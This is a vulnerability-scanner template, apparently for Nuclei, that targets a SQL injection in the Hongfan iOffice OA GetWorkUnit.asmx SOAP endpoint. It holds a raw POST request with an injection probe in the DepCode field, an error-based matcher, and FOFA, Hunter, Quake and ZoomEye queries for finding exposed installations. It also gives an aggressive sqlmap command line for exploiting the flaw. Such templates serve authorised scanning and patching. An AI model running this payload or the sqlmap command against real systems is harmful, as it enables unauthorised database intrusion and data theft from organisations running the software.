id: hongfan-ioffice-GetWorkUnit-sqli
info:
  name: hongfan ioffice GetWorkUnit.asms - sqli
  author: leadlife
  severity: high
  description: 
  reference: 
    - https://github.com/exp999fuck/poc_yaml/blob/main/xray-poc/xray-poc-hongfan-ioffice-GetWorkUnit.asmx-sqli.yml
  metadata:
    verified: true
    fofa-query: app="红帆-ioffice"
    hunter-query: app.name=="红帆 iOffice"
    quake-query: app:"ioffice红帆OA协同办公系统"  
    zoomeye-query: app:"红帆 ioffice"
    tips:
    repair:
    sqlmap: sqlmap -r sqli.txt --level 5 --tamper=space2comment --risk 3 --batch --dbms=mssql
  tags: hongfan,oa,sqli,iffoce

http:
  - raw:
      - |
        POST /ioffice/prg/interface/GetWorkUnit.asmx  HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Content-Type: text/xml; charset=utf-8 
        SOAPAction: http://tempuri.org/GetDutyDetail

        <?xml version="1.0" encoding="utf-8"?> 
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"> 
        <soap:Body> 
        <GetDutyDetail xmlns="http://tempuri.org/"> 
        <DepCode>*'</DepCode> 
        <DutyDate>string</DutyDate> 
        <DutyName>string</DutyName> 
        </GetDutyDetail> 
        </soap:Body> 
        </soap:Envelope>
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 500
          - contains_all(body,'语法错误','xml version','Sql')
        condition: and